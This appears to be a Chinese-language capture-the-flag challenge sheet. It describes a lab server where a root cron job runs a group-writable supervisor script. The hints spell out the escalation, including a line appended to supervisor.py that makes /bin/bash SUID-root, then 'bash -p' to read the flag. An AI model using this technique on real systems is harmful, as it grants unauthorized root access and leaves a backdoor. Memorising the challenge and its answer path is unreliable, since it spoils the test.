# 第 5 题：服务脚本可写 = 服务本身就是后门

## 场景

这是一台监控服务器。root 每分钟运行一个**监督脚本**去检查监控程序。
监督脚本由 web 团队维护，放在 `/opt/monitor/` 下。

你（`player`）是 web 团队成员。你能改监控目录里的文件。
监控程序本身是安全的——但那套“监督脚本”……

## 目标

拿到 root 权限，读取 `/flag.txt`：

```bash
cat /flag.txt
```

## 登录

```bash
ssh -p 22005 player@<主机IP>
# 密码：Player@2026
```

## 提示

1. root 在自动执行什么？
   ```bash
   cat /etc/cron.d/monitor
   ```
2. 它执行的脚本是哪个？看属主和权限：
   ```bash
   ls -la /opt/monitor/
   id
   ```
3. 你能写吗？你的组在其中吗？
4. 这个脚本是用 **root 权限**跑的。你能往里加什么？
   ```bash
   echo 'import os; os.system("chmod 4755 /bin/bash")' >> /opt/monitor/supervisor.py
   ```
5. 等 1 分钟，确认 `/var/log/monitor/supervisor.log` 有新记录：
   ```bash
   /bin/bash -p
   id
   cat /flag.txt
   ```

## 评分

成功 `cat /flag.txt` 得到 `Ly_Flag{...}` 即为通过。
